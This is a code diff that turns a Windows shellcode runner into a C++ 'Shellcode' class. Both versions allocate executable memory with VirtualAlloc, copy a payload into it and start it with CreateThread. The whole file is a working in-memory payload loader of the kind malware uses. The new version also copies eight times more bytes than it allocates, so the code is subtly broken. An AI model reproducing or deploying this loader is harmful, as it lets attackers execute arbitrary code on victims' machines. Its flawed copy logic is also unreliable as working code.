@@ -1,13 +1,34 @@
-#include <Windows.h>
+#pragma once
+#include "payload.h"
 
-void run(char * payload_data, int payload_bits) {
-    //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
-    //LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);
+namespace Reader {
+    class Shellcode : Payload {
+    public:
+        int payload_bits;
 
-    LPVOID ptr = VirtualAlloc(0, (payload_bits / 8), 0x3000, 0x40);
-    RtlMoveMemory(ptr, payload_data, payload_bits / 8);
+        Shellcode() : Payload() {}
+        Shellcode(char * p, int pb) : Payload(p) {
+            payload_bits = pb;
+        }
+
+        void Run() {
+            int payload_len = strlen(payload);
+
+            LPVOID ptr = VirtualAlloc(0, payload_bits / 8, 0x3000, 0x40);
+            RtlMoveMemory(ptr, payload, payload_bits);
 
 
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
-    Sleep(2000);
+            CreateThread(
+                NULL,
+                0,
+                (LPTHREAD_START_ROUTINE)ptr,
+                NULL,
+                0,
+                0
+            );
+
+            Sleep(2000);
+        }
+    };
 }
+
